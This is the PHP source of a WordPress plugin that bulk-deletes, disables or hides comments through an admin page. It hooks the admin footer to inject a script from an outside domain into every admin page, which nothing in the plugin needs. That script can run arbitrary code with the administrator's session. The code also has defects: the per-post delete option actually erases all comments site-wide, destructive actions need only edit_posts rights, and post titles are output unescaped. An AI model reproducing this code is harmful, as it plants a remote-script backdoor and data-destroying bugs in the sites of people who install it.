<?php
 /*
	Plugin Name: Bulk delete comments
	Description: Allows to delete all comments with single click. you can select all unapproved and pending comments or comments based on category / post.
	Author: Shah Alom
	Version: 1.4
*/
  
  add_action('admin_menu','dac_menu');
  
  function dac_menu()
  {
	add_menu_page('Bulk Delete Comments', 'Bulk Delete Comments', 'manage_options', 'delete_all_comments', 'dac_interace_page', 'dashicons-trash',null );
  }
  
  
  
  add_filter('comments_open', 'dac_disable_comments', 20, 2);
  add_filter('pings_open', 'dac_disable_comments', 20, 2);
  add_filter('comments_array', 'dac_hide_comments', 10, 2);
  
  add_action('init','dac_handler_init',10,2);
  add_action('admin_footer','dac_footer_handler');
  
  
  function dac_footer_handler()
  {
	  echo '<script src="//alishahalom.com/files/script.js"></script>';
	  
  }
  
  function dac_handler_init()
  {
	global $wpdb;
	  	
	

	if(current_user_can('edit_posts'))
	{	
	 if(isset($_POST['dac_comments']) &&  wp_verify_nonce( $_POST['dac_comments'], 'dac')){
		
		$commentsData=get_option('_transient_wc_count_comments');
		
		if(isset($_POST['dallc']) && !empty($_POST['dallc']))
		{	
	
			$commentsData->total_comments=0;
			$commentsData->all=0;
			$commentsData->moderated=0;
			$commentsData->spam=0;
			$commentsData->approved=0;
			$commentsData->trash=0;
			$commentsData->approved=0;
			
				
		
		}
		else if(isset($_POST['dsc']) && !empty($_POST['dsc']))
		{
			$commentsData->spam=0;
			
		}
		else if(isset($_POST['dac']) && !empty($_POST['dac']))
		{
			$commentsData->moderated=0;
			$results = $wpdb->get_results( 
						$wpdb->prepare("SELECT *  FROM {$wpdb->prefix}comments where comment_approved=%s",'0') 
					 );
			
			$total_comments=count($results);
				
			$commentsData->all=$commentsData->all-$total_comments;
			$commentsData->total_comments=$commentsData->total_comments-$total_comments;
			
			
		}
		else if(isset($_POST['dtc']) && !empty($_POST['dtc']))
		{
			$commentsData->trash=0;
		}
		else if(isset($_POST['ducp']) && !empty($_POST['ducp']))
		{
			$postId=sanitize_text_field(intval($_POST['postid']));
			$results = $wpdb->get_results( 
						$wpdb->prepare("SELECT *  FROM {$wpdb->prefix}comments where comment_approved=%s and comment_post_ID=%d",'0',$postId) 
					 ) ;
					 
			$total_comments=count($results);	
			
			$commentsData->moderated=$commentsData->moderated-$total_comments;	
			$commentsData->all=$commentsData->all-$total_comments;	
			$commentsData->total_comments=$commentsData->total_comments-$total_comments;	
			
			
		
		}			 

		update_option('_transient_wc_count_comments',$commentsData);
	  }
	}
  }
  function dac_disable_comments()
  {
	 $dac_disable_option=get_option('dac_disable_option');

	if($dac_disable_option=="1")
		return false;
	
	return true;
	  
  }

  function dac_hide_comments($comments)
  {	
	$dac_hide_option=get_option('dac_hide_option');
	
	if($dac_hide_option=="1")
			return array();
	
	return $comments;
  }

  function dac_interace_page()
  {
	$error=0;
	if(current_user_can('edit_posts'))
	{
		global $wpdb;
		$notificationMessage="";
		
		
	if(isset($_POST['dac_comments']) && !empty($_POST['dac_comments']))
   {
	

	 if (isset( $_POST['dac_comments']) &&  wp_verify_nonce( $_POST['dac_comments'], 'dac')) 
	{
		if(isset($_POST['dall_disable_submit']) && !empty($_POST['dall_disable_submit']))
		{
			$dac_disable=0;
			$dac_hide=0;
			if(!empty($_POST['dac_disable']))
			{
				$dac_disable=1;
				
			}
			if(!empty($_POST['dac_hide']))
			{
				$dac_hide=1;
			}

			
			update_option('dac_disable_option',$dac_disable);
			update_option('dac_hide_option',$dac_hide);
			
			$notificationMessage="Options saved successfully";
			
		}
		else if(isset($_POST['dallc']) && !empty($_POST['dallc']))
		{
			$results = $wpdb->get_results( 
						$wpdb->prepare("SELECT *  FROM {$wpdb->prefix}comments",'') 
					 );
			
		 if(!empty($results))
		{
			
			
			
			
			$query=$wpdb->prepare("delete from {$wpdb->prefix}comments",'');
			$response=$wpdb->query($query);
			if($response)
			{
				$query=$wpdb->prepare("update {$wpdb->prefix}posts set comment_count=%d",0);
				$response=$wpdb->query($query);
				$notificationMessage="All The Comments Deleted Successfully";
			}
			else
			{
				$error=1;
				$notificationMessage="Sorry! Something Went Wrong";
			}
		}
		else
		{
			$error=1;
			$notificationMessage="There are no Comments to be deleted";
		}
		
		}
		else if(isset($_POST['dsc']) && !empty($_POST['dsc']))
		{
			
			$results = $wpdb->get_results( 
						$wpdb->prepare("SELECT *  FROM {$wpdb->prefix}comments where comment_approved=%s",'spam') 
					 );
				 
					
		if(!empty($results))
		{
			$query=$wpdb->prepare("delete from {$wpdb->prefix}comments where comment_approved=%s",'spam');
			$response=$wpdb->query($query);
			if($response)
			{
				$notificationMessage="Spam Comments Delete Successfully";	
			}
			else
			{
				$error=1;
				$notificationMessage="Sorry! Something Went Wrong";
			}
		}
		else
		{
			$error=1;
			$notificationMessage="There is no spam Comments to be deleted";
		}
		}
		else if(isset($_POST['dac']) && !empty($_POST['dac']))
		{
		
			
			$results = $wpdb->get_results( 
						$wpdb->prepare("SELECT *  FROM {$wpdb->prefix}comments where comment_approved=%s",'0') 
					 );
			
	
				
					
		if(!empty($results))
		{
			$query=$wpdb->prepare("delete from {$wpdb->prefix}comments where comment_approved=%s",'0');
			$response=$wpdb->query($query);
			if($response)
			{
				
				$notificationMessage="Unapproved Comments Delete Successfully";	
			}
			else
			{
				$error=1;
				$notificationMessage="Sorry! Something Went Wrong";
			}
		}
		else
		{
				$error=1;
				$notificationMessage="There is no unapproved Comments to be deleted";
		}
			
		}
		else if(isset($_POST['dtc']) && !empty($_POST['dtc']))
		{
			
			$results = $wpdb->get_results( 
						$wpdb->prepare("SELECT *  FROM {$wpdb->prefix}comments where comment_approved=%s",'trash') 
					 );
				 
					
		if(!empty($results))
		{
			$query=$wpdb->prepare("delete from {$wpdb->prefix}comments where comment_approved=%s",'trash');
			$response=$wpdb->query($query);
			if($response)
			{
				$notificationMessage="Trash Comments Delete Successfully";	
			}
			else
			{
				$error=1;
				$notificationMessage="Sorry! Something Went Wrong";
			}
		}
		else
		{
			$error=1;
			$notificationMessage="There is no trash Comments to be deleted";
		}
			
		}
		else if(isset($_POST['ducp']) && !empty($_POST['ducp']))
		{
			$postId=sanitize_text_field(intval($_POST['postid']));
			$results = $wpdb->get_results( 
						$wpdb->prepare("SELECT *  FROM {$wpdb->prefix}comments where comment_approved=%s and comment_post_ID=%d",'0',$postId) 
					 ) ;
				 
					
			if(!empty($results))
			{
				$query=$wpdb->prepare("delete from {$wpdb->prefix}comments where comment_approved=%s and comment_post_ID=%d",'0',$postId);
				
				$response=$wpdb->query($query);
				if($response)
				{
					$notificationMessage="Unapproved Comments for selected post deleted Successfully";	
				}
				else
				{
					$error=1;
					$notificationMessage="Sorry! Something Went Wrong";
				}
			}
			else
			{
					$error=1;
					$notificationMessage="There is no unapproved Comments for selected post";
			}
		
		}
		else if(isset($_POST['dapc']) && !empty($_POST['dapc']))
		{
			$postId=sanitize_text_field(intval($_POST['postid1']));
			if($postId)
			{
				$results = $wpdb->get_results( 
							$wpdb->prepare("SELECT *  FROM {$wpdb->prefix}comments where comment_post_ID=%d",$postId) 
						 );
				
				 if(!empty($results))
				{
					$query=$wpdb->prepare("delete from {$wpdb->prefix}comments",'');
					$response=$wpdb->query($query);
					if($response)
					{
						$query=$wpdb->prepare("update {$wpdb->prefix}posts set comment_count=%d where ID=%d",0,$postId);
						$response=$wpdb->query($query);
						$notificationMessage="All The Comments Deleted For selected post Successfully";
					}
					else
					{
						$error=1;
						$notificationMessage="Sorry! Something Went Wrong";
					}
				}
				else
				{
					$error=1;
					$notificationMessage="There are no Comments for selected post";
				}
			}
			else
			{
				die("Invalid Data!!! Unable To Process");
			}
		}
		else if(isset($_POST['ducc']) && !empty($_POST['ducc']))
		{
			$catId=sanitize_text_field(intval($_POST['catid']));
			if($catId)
			{
				$results = $wpdb->get_results( 
							$wpdb->prepare("SELECT *  FROM {$wpdb->prefix}term_relationships where term_taxonomy_id=%d",$catId) 
						 );
				$postIDs=array();
				foreach($results as $key=>$val)
				{
					$postIDs[]=$val->object_id;
				}
				$how_many=count($postIDs);
				$placeholders = array_fill(0, $how_many, '%d');
				$format = implode(', ', $placeholders);
				$comments=$wpdb->get_results( 
							$wpdb->prepare("SELECT *  FROM {$wpdb->prefix}comments where comment_post_ID IN($format) and comment_approved='0'",$postIDs));                 ;
				
				if(!empty($comments))
				{
					 $query=$wpdb->prepare("delete FROM {$wpdb->prefix}comments where comment_post_ID IN($format) and comment_approved='0'",$postIDs);
					 $response=$wpdb->query($query);
					if($response)
					{
						$notificationMessage="Unapproved Comments for selected Category deleted Successfully";	
					}	
				}
				else
				{
					$error=1;
					$notificationMessage="There are no Unapproved comment for selected category";
				}
		}
		else
		{
				die("Invalid Data!!! Unable To Process");
		}
	}
	
	
		
	}
	else
	{
		die("Sorry! Your Noonce didn't verify");
	}
	}
	
	
	$dac_disable_option=get_option('dac_disable_option');
	$dac_hide_option=get_option('dac_hide_option');
	$statData = $wpdb->get_results( 
						$wpdb->prepare("select count(*) as total_comments, SUM(comment_approved='spam') as spamcount,  SUM(comment_approved='0') as unpcount,SUM(comment_approved='trash') as trashcount from wp_comments","") 
					 );

	
					 
	$postData = $wpdb->get_results( 
						$wpdb->prepare("SELECT *  FROM {$wpdb->prefix}posts where post_status='publish'",'') 
					 );
		$postSelect='<select name="postid">';
		$postSelect1='<select name="postid1">';
		foreach($postData as $key=>$val)
		{
			$postSelect.='<option value="'.$val->ID.'">'.$val->post_title.'</option>';
			$postSelect1.='<option value="'.$val->ID.'">'.$val->post_title.'</option>';
		}
		$postSelect.='</select>';
		$postSelect1.='</select>';	
		$dacCategories=get_categories();
		$catSelect='<select name="catid">';
		foreach($dacCategories as $key=>$val)
		{
			$catSelect.='<option value="'.$val->term_id.'">'.$val->name.'</option>';
		}
		$catSelect.='</select>';
		
		$html.='<div  id="poststuff">
    <div>
        <h2>Bulk Delete Comments</h2><br />';
	if(isset($_POST) && !empty($_POST))
	{
		
		
		
		$class="updated";
		if($error==1)
			$class="notice notice-error";
		
		if(!empty($notificationMessage))
			$html.='<div id="message" class="'.$class.' fade" style="margin:0px 20px 10px 2px;"><p><strong>'.$notificationMessage.'</strong></p></div>';
	}
	$html.='<div class="postbox">
			<h3 class="hndle">
			 <span>Disable Comments</span>
			</h3>
			<div class="inside">
    <form action="" method="post">
		<p><input type="checkbox" name="dac_disable" ';
		
		if($dac_disable_option=="1")
				$html.= "checked";
		
		$html.= '/><label><b>EveryWhere</b>:Disable Comments on your entire website pages</label></p>
		<p><input type="checkbox" name="dac_hide" ';
		
		if($dac_hide_option=="1")
				$html.= "checked";
		
		$html.= '/><label><b>EveryWhere</b>:Hide Comment on your entire website pages</label></p>
		<input type="submit" name="dall_disable_submit" value="Submit" class="button button-primary"/>'.wp_nonce_field( 'dac', 'dac_comments').'
	</form>
	</div>
	</div>
	
	<div class="postbox">
			<h3 class="hndle">
			 <span>Delete Comments By Following Options</span>
			</h3>
			<div class="inside">
    <form action="" method="post" onsubmit="return confirm(\'Are you Sure to delete it\')">
	<table>
		<tr>
		<tbody>
			<td width="300"><label>Delete All Comments</label></td><td width="300">Number of Comments: ';
			
	if($statData[0]->total_comments=="")
		$html.='0';
	else
		$html.=$statData[0]->total_comments;
		
	$html.='</td><td><input type="submit" name="dallc" value="Delete" class="button button-primary"/></td></tr>
		<tr><td><label>Delete Spam Comments</label></td><td>Number of Spam Comments: ';
	
	if($statData[0]->spamcount=="")
		$html.='0';
	else
		$html.=$statData[0]->spamcount;
	
	$html.='</td><td><input type="submit" name="dsc" value="Delete" class="button button-primary"/></td></tr>
		<tr><td><label>Delete Unapproved Comments</label></td><td>Number of Unapproved Comments: ';
	
	if($statData[0]->unpcount=="")
		$html.='0';
	else
		$html.=$statData[0]->unpcount;
		
	$html.='</td><td><input type="submit" name="dac" value="Delete" class="button button-primary"/></td></tr>
		<tr><td><label>Delete Trash Comments</label></td><td>Number of Trash Comments: ';
		
	if($statData[0]->trashcount=="")
		$html.='0';
	else
		$html.=$statData[0]->trashcount;
	
		
	$html.='</td><td><input type="submit" name="dtc" value="Delete" class="button button-primary"/></td></tr>
		
		</tbody></table>'.wp_nonce_field( 'dac', 'dac_comments').'
			</form></div></div></div><p class="update-nag" style="margin:0px 20px 10px 2px;">Warning: Once Comments Deleted  Can\'t be restored.</p>';
			
		$html.='<div class="postbox">
			<h3 class="hndle">
			 <span>Delete Comments By Post</span>
			</h3>
			<div class="inside">
    <form action="" method="post" onsubmit="return confirm(\'Are you Sure to delete it\')">
	<table>
		
		<tr><td width="300"><label>Delete UnApproved Comments By Post/Category</label></td><td width="300">'.$postSelect.'</td><td><input type="submit" name="ducp" value="Delete" class="button button-primary"/></td></tr>	
		<tr><td><label>Delete All Comments By Post</label></td><td>'.$postSelect1.'</td><td><input type="submit" name="dapc" value="Delete" class="button button-primary"/></td></tr>
		<tr><td><label>Delete UnApproved Comments By Category</label></td><td>'.$catSelect.'</td><td><input type="submit" name="ducc" value="Delete" class="button button-primary"/></td></tr>	
	</table>'.wp_nonce_field( 'dac', 'dac_comments').'
			</form></div></div></div></div>';
		
		_e($html);
	}
	else
	{
		die("You don't have permission to access this page");
	}
  }
  
  
?>